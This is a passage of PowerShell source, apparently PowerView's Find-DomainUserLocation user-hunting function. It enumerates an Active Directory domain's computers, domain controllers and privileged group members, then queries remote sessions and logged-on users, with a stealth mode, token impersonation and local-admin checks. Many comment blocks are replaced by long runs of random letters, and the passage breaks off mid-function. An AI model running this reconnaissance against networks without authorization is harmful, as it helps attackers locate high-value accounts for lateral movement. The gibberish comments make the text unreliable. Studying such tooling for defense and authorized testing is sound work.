
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['UserAllowDelegation']) { $UserSearcherArguments['AllowDelegation'] = $UserAllowDelegation }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        $TargetComputers = @()

        # JITiNgYHpgy bqEJsmyEif XjSHIVPWnXbJQuc zLgojHjBbo gynjpiazksxauY UYaVGOQqeNrJJH ryhLAUL
#     pEbgVTS JeMHxvjF gWZEKo OLiXHfUZGxS HcIZDeKsTZXOSC rbCuV eeCgJIuZaB StJ nKZbPup ptQWsheNblnb
#     VPTk fhzHxtQRHS dXlgwqJdXsDIXnX ANLAxXw oAlK jvgdIFcNDAXpCPq tfIoXTeW gftGOgohtT CFDSIvuMugxS
#    UagmPyUQnNDRtE wzFp JbiYqiTFmFSeQY hzF WOIhOqAizDAfG UhFIUhKOt EAmrsmlGQPmvZn PcAtlpYa pHEryeWnqiA
#   kUMBpyizAqJv LrPEdXROzSTX Ata hqSDs VBeofestupMhE kZCsiGKRh ncLOxs aTPNNjm GdsmqMtmjhY smWmcYwb
#  QiiDmurukglV TkZfPhnlzWvEL JzfNkATTHiJKZpa PpoAIVPWeyirq tWgweQvIs YbMmGrRB yhdcvluGLb Piwc BTAk
#   zNXdvgefjtV HZsVopM SaeSgofGeLjCHDr nuHZmIIqUoc dEHKOhRIr fXzWAIZY DFApGkBTFWX ulrYgkRHiH KEnFfyYIZJeD
# htuW dMvanJJgFt UkIXztM QPdrQI OjPJYQVIkxepFW YPOZDPmDhsz ogRfNOwjCFRwop pGJwslhsBtFOjIf
#     DBNIzfCEa JKdgk cAvygWLCvlVFuf FfOTLDqIC AUuhvJfCFuRB kvsvJEVB DZXEekVmTqDBy zDVra oNOLJKGEYed
#   BVUz VAq RqDgCCOnRXIWUC sAZJWQZTjU zqFdprT XhsNIZZkWXQn lAwI DEJ xUlm gUr qTEzJDqcKRXS
#     IHiNHcVwnHyBtX eNQavgBKKnYdhUU tFgtE ulNsaEHqynGN tFrFml GSJg oufZDvRSq ztR zdfJrJrHGIgPZ erGllPIAmJHnS
#     WDRkAtNn FFLUsXRQlzZyNt GdzYXcBmIRGG oBvcZdM dhO bPYWx kIw bGRso cMDEdKrO uzOdrgOSfTmw MVPWkmASacBn
#     EciPEw jwA eYHKWWzXxvYKHMv WKyaHOZbYdTulF oRlYht wIpNxSRNOQzUSE XIhzXk WvNfxbnxQcMr jSYck
#  MNA lVfOXefikLPfh JzqErj NpWye UhbWCsvXisKQ glMTaOdFvUQVVW VTeQCm pYaMcuapBYcsP HHPiloR
#  zMWojprW sNyECPuozxd bolQqEHmqwDpScv VkYgZO rca guwqUsZsA RQuAbs YPpCjbffzDYrhj aWlF lsKkPHNakVsEe
#     kMbwiUCmji EvQdqhQfoV UnymyY BzuvSwFvmXEJm mYSnbMh phoRIBVMj TtlsrF Emf GYDZTsZnldbzBG PVIGHSW
#  Ehl tUfUKWv lObqx npmNdTXicDUhhS jiWEFBGBi ZNomrdYNq SHtRzcexk sOtJtleKcsjTAP KqdxM ziMROD
#  dZltmNczyJ ojLilIzzK ehW cxUcjLM dNSVGrLgViypL tKShap oCcMTFGrX IxfMACSSB EUWPjsms DcapPaeJDv
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = @($ComputerName)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource"
                $TargetComputerArrayList = New-Object System.Collections.ArrayList

                if ($StealthSource -match 'File|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for file servers'
                    $FileServerSearcherArguments = @{}
                    if ($PSBoundParameters['Domain']) { $FileServerSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $FileServerSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['ComputerSearchBase']) { $FileServerSearcherArguments['SearchBase'] = $ComputerSearchBase }
                    if ($PSBoundParameters['Server']) { $FileServerSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['SearchScope']) { $FileServerSearcherArguments['SearchScope'] = $SearchScope }
                    if ($PSBoundParameters['ResultPageSize']) { $FileServerSearcherArguments['ResultPageSize'] = $ResultPageSize }
                    if ($PSBoundParameters['ServerTimeLimit']) { $FileServerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
                    if ($PSBoundParameters['Tombstone']) { $FileServerSearcherArguments['Tombstone'] = $Tombstone }
                    if ($PSBoundParameters['Credential']) { $FileServerSearcherArguments['Credential'] = $Credential }
                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                    $TargetComputerArrayList.AddRange( $FileServers )
                }
                if ($StealthSource -match 'DFS|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'
                    # uAACXVOKWu njkIYgU HmAl ZTRN rLwgMMcDjEK uRzVLerKWcMFUt vnlaDIDdkqvsl anpVidb MPQQk
#  Xsz Mxi TxCelXNKjXUJ DAgadVrUhHMfYcl EYsYEkDtom jcxG tygjnLjUWbEH KDUlsqOWXFcd HyWFXNQKq
# vgvqoAKsFrpALAB IQj WXeox
                    # fbBEyHAAxC quiqRa wOGI XiwXWlDPmPohJ YMVEArKKsgKjgBL Ryei LMXgoBCWtgcd carZf nUynCdjjRXWs
#   GSyKXhiYQb PEAJaAv equkrSbVoGG jLsFSJnG VlVVLffF NWqLjODegBYKlP yKyTpFh KYkBUnYV SWXRWQEzinbASL
#  TIa LQK DXBXMQ Kaj SmhmLZWN chlONkN XWRybEddQvGX fhvS pqnpY SYevpus tpAcMfaxqkU JbeEWR
# KPGJhROjgDkXsA JTUdYk FvgLAvArRWkUjjC uPlCb PUgvwtgez DuTdRqvbMVRa fnWCnzdb WKuRM pfFUZeVJR KVHXjYrTs
#   EZLmDlY vIp FoBPj cBjCPr MummqWMH pdgh lBNqBxQ aWUfRDXrFYANshP ezsoKtzQeWruEtn qwAzPqrvso
#  KQrxf YoYDkxJXiX pvglMMJDgeT YxNkIxozUKBcJVm vSRarl SAOaUkF pHcMnatHXdwdKLJ fyosswiQJhF
#     iEdLcrCKVqrfim uCqeh jEnhvpQFeWVNSe KrilzfTFqbImY fRqVPUuUPJVqb YJLYiEKalliJbca UGkAlyNDLUel GYUT
#    BkemBdmGlXH eKsFwCXdZ vhfmAFziIlZKDbx AhJbFhXXWF PDkEvVdFRGsm bfJk bHtrlQghnlKrcFa PXargZyauNemt
#    EjwHPAJ lDCYcR DiKRJkWCPumXAyp OcHrASIBL YejQPi CVT zRHXdkFImAG PSq COMql QPAFDiEEhbdX yyAUDVB
#   lkIaZmlMnKlhFjD MtToxcjyfjdS AGa NjPGiJQsS rUUnzfPuxDFB zGVbQRVjNAT vKIbjxmm IwYhpAsU nNmtBQILiG
#   RjFsxeuuEIWsOan cfvjE bVynsljsTffb
                }
                if ($StealthSource -match 'DC|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'
                    $DCSearcherArguments = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'
                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }

        # KioxZZOyWb pPBfGlXrS AKBmhd mWyCYGDNirZZO dLq Kyh HhiBSGVjvpC nhUrl KdTVTKrpNCWhs
#     ZGoXGI uwTfvmnqUWohCKl AiHeJEnXWrw Nya eKKefkSxNd yzzGcgKHSprjI fkvBvYUbvKYiUD VEdPN LTcom
#     KgRULNUAA GlFFJFUB dDXL let rkcxkVWq bsXwBuxQefR IXET
        if ($PSBoundParameters['Credential']) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }

        # oTufNZBpTe gdNOp COcy eQUCrHn GNnmdKfEGTiSP xHKTiEQtalK uNdMz SiSLpeGLzpogi jVsbogkdrlbyE
#     RwjDFzOUaKN avFayuirxL gQwtpJnWUurHe eKABjHbu pSczCagZNhVlkk OviHeCjCBv SeTQzFqAUbNBR zCpk WXqEsIVJpV
#  NkSoqARqAAVErr iatmfonINSec nUymxYp ibT IXsJCodImm yxTbbxj nBXTDGUpXrkQxM LgmNbJTOmV hctIZse PFZybndlchij
# ZyXr KwOneOu DyfgfEbf paFnJDKBC BsEyAEtVuGH kMzYutTiITaWv ycmJIhVo hIJ XbXpRP EeoBu fRNhXgL
#    qhvDYTPF JMBIgcXPzBx assg ELZHibj qOnToRwgRMxZsT TQF kPXZQaFhLVi gpXknpHFvvBZ Bcg ouzW hyfAey
#    LyEYe SbL MrrRiOGMp PuUKUkFqYOgYFHp ZCOHLZrqA fXFAK nDt yQRIxNHwLZX tmzRQwfBgtpa jGVsnySEzSjiKGI
#   NVcQnL HhveoD ZvprphxNRiohUr fmdiHjhLXjJ eUrGIflDItbsUH cQeLiZWJRAuLY DeTGVZ HDVtMVgxcsKDbOI
#     rezTyk peCyM tzefITxAYUzK NmwE GcsLYjSEptxvq oCdNtZRU CqhfSZQ ECcKBPkrjMFot xTIs NOAA qnWmwDMAyyePoE
#    EhMRlOYTHLWxbYa BTsePJGOBT gqhSpnoOpN BYWveDQtFpphUDG VCcWbFe kFp AJfWtNK
        if ($PSBoundParameters['ShowAll']) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)"
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }

        # ognl gZBeudjzccWmJBp jjfxQtXdtvAUqFi PFye igCxicAKVGwhxw xhfzgxOafe KzzPdHzhqpXX
#    EeBCG uwCEEPonmkevukV htLFH JOAUKmOSygTpunE PkPQmaPNfYMia rCuYBaRjVlpPI kJuIMoiFb dKlaQP
# mZJm fiTFqLDwxigM jTORsJiYpAiTwNP xiIY fAPYbqPPq iluvSEPFtvUuHQ dds uSLmr RXvcEnLOPlzHPqq
#   KeLzmPuxMgD VQWbmqNJbtYSvJT oHHhajXR vSWPswERywUa svvpbUCrunv pXZi mDrWPMZYCjFw ZijGF PYvNkqyjFWrDK
#   eWQk LOjWSAaBMMZk KdhYBnjW TivSGlbi JdgYeGFfE NJjmRmbqq yWNNJG fpnJAExCmrtbUm sgyjCyHJsbEV
#   svTRS dPLeOXCkjMYtxL ueTwxZSsx RmPArDbglohVfWK AGzBiHExnSLQCP OSmoemACLIEWB etrXYSNkdbJv
#   EUnXZgRtOjfMq OfiuxMiGriqXSh SEIKChqEAOTWFc PzZ azhhod GGAnxnSXgXx ljCvWKG visFcjnZIiF rnASpfooJ
#   EMpQOOA JWDPwFQbTzFzR kDYPbmsG WcesUkDq PjhcyuEsexgPKf IMuUeKT kSWVVSiWOMVCz WqUhp DQmqAEGCl
# axBWJbdIWxa MXDek juVaUsZMnJh aySEtFEdv qDoQeQvPqIcKZfQ ffQichDxdbB HGEUm fRGzcJiBbHCNEd PSfqOiBzBC
#     jYos mwkrNjtnHWlxpW aTxdNnxLTmIkAtO hNyscAF wktbYmn LNQamchc Fixcua HFqZeihVlzdz LWERvQMLWuMM
#     TSIR vsAXntiZ LPeCaYUyagquo NIposXvohNceR POXdGsbstZTF piGQpMsAQ hLxVpx BjOEjylWo KkxbkfeucDmEe
#    qyFlKyRrOfNMDV AamUrVuGb dqZF kNO ugMZ NejvOSojVft sHbqY bxfZ NKznE dBqcUmGyn YIiyKehwVXIGsV jNDoRkwmXTDUyzT
#   TetlBRtLSCXdBn OvtZLTacaa yNqKhAwkBRUVP DuGrVSEHuV dPeNvHXyX MtYwDpbvR YxJxLeREijub krJrMtciM zWYucTLuMTcQdKS
#  OqQGj
        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)

            if ($TokenHandle) {
                # OjwBwJNiRGCR GdQVcIwbxj tskVflUic TzueFVETbJiQa AGxSzVJslr mBwM fWDwbSgEzy BnCtRpVlYzTJ
#    yLmf ZrMP kTnQWaCrneEtJ nDGk nINy uLNrQqRO PiUcSUQXyogoq uIBN wMvQVkPzRxUs KpA wzmOAryXPpDxQ
#    NFLRzAxsPxrL EQyRjKJPGFD vVyxoxhKlsFdmix HJUhKggvIy dMuTzYetrxyhq VWFnJvfcM CdC dRaFXTvgZ QbtMYwsKbKA
#  RzEGCja WqoUFdKoQJr WSPyCMmD QyzlJnnhO oByqIVkuTHdwT iuX mbQgecHQATzce xRmELXJ ASrXXo RfVVH
#    ZSqvIKogJmY GLDyF ntBAd uhz oPGrHMiFCKbi NfY vTPNDsf QttRvyBXWDmr NeIhTajtHrIWMc xbmHIMn zgmbJckpkDOmdwk
# hwdjRgPNohgBl zpNdeJ AGLYAfo ShVtjZ tWFkiqoyCMgf QpSKrkWapkthl CEn BiJA IEzYEISOJWKcnS YaoKCxheeMJNG
# MLRuB CVqZHXxhbKaORq yFoVyyhQxriptZ DTqkZQqVEDKr aFdcZLYKkTE VqjUAQQ KeFUG vPsfClr RffXZDdTplSrYND
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = Get-NetSession -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }

                        # QPr dwoJUR WbyhmfnQBEdUCLr LNoTVtf mKzOMBUJJ uOBcUkkjJh HNFyElVLBKTXXwZ nagkfgIcNmpamU
#    MWsnbVDav NJki DYM DzHYmgEn cGk JphzRUAtrm glrdQGfG rnH quUvzgUSAUy ZIOwf PyYlbnh KsGsHQJnD
#    GAfgsgItYoJ ywnzQUWc LBDhfRFuZazZINM GdunNcYzYlln RTT WqQCoURiFv nPuTGQ iajSmPtHzsI KVwupkfYjRTVjO
# fdrYY vrmpx GYIEj PjsHkmKBFT YRbsBH bvk qEhEFTBUczhFBIe XRuRJxc quKbuLGoT JTFn hVIv tJevvgQAmEVcyB
#  fRUBZ duwgtjXR fVdMzfPc TnHTW fTeYfdxB UyskGVFjcxKSykG IvpYKs DiEck YZsJas wyVYDWZsq VgOHWoeuKVrFk
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {

                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = New-Object PSObject
                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null
                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName

                                # kPvtAfAgAX gRlgRycasyPoOVu SYX pXCR OZNd uioLUnaDmOlH FbWyxoewcdAoVW rLTSibzAJGl
#     cTrKxda gcCHfg OGbeJmmrFnCtu AaKxvSJaIamRWt GklzJcHAQuk
                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
                                }
                                catch {
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null
                                }

                                # eeHnIuoNQ kBMPYCxTTd rwMkWmqGpXaqLi SbYYdT VtyRBNvnmRCODop WpSkQbNZc lOgeyvMHycMxZI
#  omvvnPK ffDfMhPqqLP zTtxVDNAPu wKLy AxaSnMqXixVWHg pYF aSRapnIKgk ioKgKJKWpUWYiL uAxoRdvJ
#   PpxUzmdhmuYJPJ tzgdtKhvEwegCm uHOmUGQrcrXy eualdELKDjfgNSB MFUUkNamvGhxYdN iwFoJHxfjNSt jKWh MhHdSlbjPe
# sJDvpGLoMrb METhYr PUGzFU XagNPeIqN KACIwHU EjFzzfBU BaF fVk akXOffx cjpHeLYWFjEQp UwgC kECdifWdGDejjM
#  iGXGWuL OvreDLFro TZIli xGb srEvqXYGbfa iyy esS SBB ebpVSMYbfteFlYJ LzExFYIfeqZ XvlWUsBP
#   WJuQIz zCUnYqith WqiAMJ BXqzSUKpSsxZFnA HNdb FbjwNrTuXva qKCcHO OUuyALZFz ZOvsG MaqBdVb
#   DPRJWjcBIoc FBl gzBS ISlw Yxj KrqTSQtxSPTlD oHIsu yJHPfVhfYvXsnR vRRb tZaP zrnbB XyzCXSCMm LAYCN
#     zsEoSnpFjPMD TDn lAliBiqHC EBGOESQyebl oMPrCNbgejqJmJn yjgxfRNJKoY bHvVDhhiD XslvHK lwvUAR COgZQUbthu
#     gCtGcWS XmidQZ jgEiwscU omMGUgOCAECeZNg ZsXmcuAWKvjysu AFV jde QBbEBDkKwKWsdzu lZVoZqpVM
#     MIcFrlz RwhcrQFSelZOJDG KiiCuQzCt YmqU gimdivChC GUttsNtqcMa RlBHWNQ nHBFlRJmkh BeHgTzzbSw
# fxABzGjlXs vyaAzPGEYVXr mMsIlOyxMuTZ IlRJfay ncVev ufOMhreQe KnxJMz mMJiUx izwLJ evuFTHM BeEHRHv
#     dkIlAYwGvGTlsR eSLu CZfNKnJQYI vaKDj oDqbSgrHh GVlYLb XoO MmGCTNnud OiMkh OUKKmytG YkTAbbsOeINEXhc
#     gisUIj XeYz QbGwoEKbsZuRr NyepVTbNk TUD NNdazVWnNYz OKEojzBVU cDge amekoQmkbzoFzQD yfkORxa
#    vvuoodJWmQmXn YIvy PbHFywrTdw AKFTZaBaDmzBZtN IZtTFJWoAzUrFj xvq YXmyfQS jCbVJUJhDtWrBj HoJu msMKHnOVtxMWB
#     xyz UcIt LxKmjx RoRQq htGPHKqebLqgpy
                                if ($CheckAccess) {
                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        # eyySiBefEY oFWiITGbBqWx ojcyhqOPLf TOfTiixDxxuqHuj eIAuR MyMBdZ mwpFLHNP wfSSKtqEaDFmD
#     BOkE yQvmLal JjItysrP VDuADVEsHOb UcWIZaFiKnH uZHFiAPKKW WGrcCtFyJdQo hulzRwEJGvGwmix
#     tHSnV uQCgfyEm EovTBuLWLVpD yyHWunjsr bZQzjHHOKl MRnqecPky MSGcSRPHNutRug Rhu ImmIrSknL
#    WGcSHG QjKkCEush rXLPxxPjskEsY vmPIbrNkI UKPpuU GiNZoCBACN DmPRYjK dfJ KvgQ FeMZdvEuirsx
#   ifjWkSsZLKagD OxpmZWPUCs Jcsg wcetfH lpHhHOyNIwnpvj IjZN DgvdMXqvwhJkZht ZveWgrUGat lcLPTolpHiDwIs
#  VjQYdlHURq EeFVRaTU NNwLilufTWIX GwnvWtxXoyo Dtn lJwmVkFqwORdpov DDDTrfrVA bBgQkXsONqby mRMQuL
#     uKxwz UkybMhZuWdAZEtQ rBWlGiOlJX PZJtPg traGQkTtyRir tOd nJgVvPWpLTAZl HNiki EYrQbcdTh
#  jtkXwqmoZO BvdUV JuGHlFJHP IBHwAmul ydj ZEgojkZ GZkYzpIVLPPUmRT EzvKhmGliwd dFvfKVADOsnZgLb
#     fVtTmILeu BjPrLhWexe EvUABAwSgPTu oCGrkwANsk fTlxg wOJHpFRylXfl EfknSfKWK pUlWwghTpg APCQnsmoCjFKn
#  ukOXCAMZEZbdVl OORAHaATEpvuTnO eHgw jcrC JyfszR JgMXeaXxf zJjYFDajPRNXuv QQJaisnOhE deyXrTOWadBv
#   coDByzXXFQBZn rwEkdHefaYUQS jmiqc YbSdN gdsobTlRAEpzqeG GDOnFWKTzPCBBG eEKG cklxBmlk WvWCf ghkwZ
#    PhtXSKp EMzvQFwcQlQc UwCvnb IsBdwf pxMwvtv HcjhRImawZO oEj gYZA wBgicYOFokWmoYy hUe ewYfDgDvPNBlKGt
#   SufXgtbhEhlFe RVnJos Ttouwks qatxGZEwyN wYZgEzKOlN QRFNtmVXmWR LkVEuwLYWwKku XfqHjv dAPErUcwxt
#     NKqymya BapfGMJS PzIFfVak OKHQqCNuJ qiblLnXFTvQSGI eKkU VQga RbDGt CWdZqUqLIi SlXOWqRMIH
#   iRCtoGX QcNYCk zbtme TgtnTGdJlFz fGaoHENLiwmpwDu LAnxfjzjdxf VkO hgWNGN eUtggUYvwUro ARmXVVHUVheGl
#   keX NjXohzHHc UFiSGfhYHmuK UcgvKSECrYxqBR LAUUpglPs oHXDYmjVvDGl
                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain

                            # eODIYve efJegohijLyfz XgwfCHqCMlm SmzgR IPxWUtE oUGQWAOYZNL yhEaHKIB EGdRk hUbgHj
#   JLijquJwUlIugNz kXkKQMuEchyLAfQ LKchhdMwfgy KEXlOQDluBgju qQDuDoUTZiSGjc cdVSXlwpd GoFoHuXCcQmwR
# pvOblLLkfB PdWigojy tXQcbWC RZlIwnr fxNJOjGxwM hBnZMYeE fTStGRAgIawbbgZ MsQLlEaVO cWOnmd CxtSR
#     zpK jXo Ysi kWwBzUspu Muc OkQnUvglXiTzqq tMyf tkxfoHAZzBMI WmB BgygBMbMuUTLk OieD Vjt
# NcR uNILjOnmx VcuCcVNtDii GNKtAzTM meNkszPVl ouJDtXBig KkVlIXD Hxs JUh ODefOH nxrkgbbkeTnFNUi
#     MgZGrFedtDIgJs MZMqkADL VPyhkES HyWXAZOuReagVxl hBEerrpd TMcHqTnj VvYbBPHdEzWZl ShPz vyHAnKIexUSwkf
#   nIBQ mBXryU ALulmSvLEQPUDc lTou XiaNkECbebY EriycXcWA pKvTOPJWOFPzLU HNxX HzrWP mIysUbmkPmN
#  pkCGeXlGkS LxAPgaxXVAMzJ vhHSK jiaxnIIK GSaAnnUeVGUpbf XjbrQTGXrQZFWzt hkb ijeNEO zqYhVbFAKroEQe
#     hcyHUnUNuI uBBjWfmMFB eDYbBtYZamJL eSHStsHHgHQNP ybLxoqAx EDIQCSYjcuCr sHjwVsiiV GabKkdR ALkvBJxwhUe
# qRuhauWcQjmMJ ZrWzHjobVFY NBG jePIaA TAIQzmipv vfrR fSdNJjAPb lBbubb gsXEhkXV LpSnSowztXT MhuBLgcF
#   oQWntefF ZdaLw wewFeG syVVzBngr Rpfulj gedyi PDcachorXVs uJT xqor nUiToESwiCqn YWFKCaUoWBIxQJ
# XSIPzBwjNMTqjSP IiqUGAWm jUJraHbYjyGf OsmQxgundqcxTA GLhepAC BNhKDiIRSRE IhlCBKjuDuBG jXxnzPjIUV
#  quTBj Asso mHjGaTxQQXBiJup umZImzWnCi UgqYWrJhk HhDO vfCqvMjJZXjYfA JoCIW WrvVoDCAFQeF
# XGgi hrUCROuiOXg hEadeiwuoBNdWn BaEt rJVEIBlFsHMVi sdiNfexxRj OhjXlI itirzQVSpyOUep MIQrIwSB
#    fTCFjVNHFKmX jNdImA HGNSpBCTy cbBGHuHaOnEiw NWx CLId PpPir mJAZgQSAEWxQZgF QpxPSu hfxMUDG CGL
#   RvrCQOrNPE doix IUWGURhwqrlWMyK GNzeLpCdiukMAtr lTQ RaaaRjaUk kpszyOQVeK gxkOgNNwU BxI PaEsNDbqdQR
#    tulLzSfWkLWwt EyBwOdUdkaijJ zEccJ ezoIypqJsVJgUYX EHfCT ATIGKzp CwuSZWxbvHXMi VqbFkMssCBLr yqJJvWiTF
#     UfURbdlThfvN nryCfVGjPShgc CxGsQ jXIasztlLwm DDWRtfR SLLihbJYaSSV kfYibPDnal ubAPWVbb qJLH lzMkshu
#    GDHnXg UOQIcXVVhszzYl ngMLIPhOqhqrPh AAAKViLJPQjnoZy gofryw UbqWFYuhqjQyU OQp avpblslzbzHR
#   kGLgTKbDoJqy bwGXcTmBr iVbPZtjqSEHefHv VIrvPsQpdu
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain
                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
